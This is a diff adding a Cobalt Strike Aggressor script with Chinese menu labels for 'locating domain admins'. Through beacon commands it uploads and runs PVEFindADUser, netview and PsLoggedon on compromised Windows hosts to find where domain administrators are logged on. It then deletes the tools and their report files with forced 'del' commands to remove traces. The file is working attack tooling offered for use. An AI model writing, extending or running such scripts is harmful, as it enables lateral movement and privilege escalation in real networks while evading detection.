@@ -1,0 +1,80 @@
+    menu "定位域管理员" {
+            
+            item "PVEFindADUser" {
+            bexecute_assembly($1, script_resource("/script/PVEFindADUser.exe"),"-current");
+            bshell($1, "del /f /s /q report.csv");
+            }
+
+            menu "netview" {
+            item "上传 netview" {
+                $bid = $1;
+                $dialog = dialog("上传netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
+                drow_text($dialog, "UploadPath",  "上传路径: ");    
+                dbutton_action($dialog, "上传");
+                dialog_show($dialog);
+        }
+sub netview {
+
+    bcd($bid, $3['UploadPath']);
+    bupload($bid, script_resource("/script/netview.exe"));
+}
+
+    item "运行 netview"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("运行netview",%(domain => "waf.com",bid => $bid),&netview_run);
+                    drow_text($Dialog, "domain", "domain: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub netview_run{
+    local('$Name');
+    $Name = $3['domain'];
+    bshell($bid, "netview.exe   $+ $Name");
+}
+
+            item "删除 netview"{
+            local('$bid');
+            foreach $bid ($1){
+                bshell($1, "del /f /s /q netview.exe");
+            }
+        }
+    }
+
+
+menu "PsLoggedon" {
+            item "上传 PsLoggedon" {
+                $bid = $1;
+                $dialog = dialog("上传 PsLoggedon", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &PsLoggedon);
+                drow_text($dialog, "UploadPath",  "上传路径: ");    
+                dbutton_action($dialog, "上传");
+                dialog_show($dialog);
+        }
+sub PsLoggedon{
+    bcd($bid, $3['UploadPath']);
+    bupload($bid, script_resource("/script/PsLoggedon64.exe"));
+}
+
+    item "运行 PsLoggedon"{
+                    bshell($bid, "PsLoggedon64.exe");
+                }
+            item "删除 PsLoggedon"{
+            local('$bid');
+            foreach $bid ($1){
+                bshell($1, "del /f /s /q PsLoggedon64.exe");
+        }
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+}
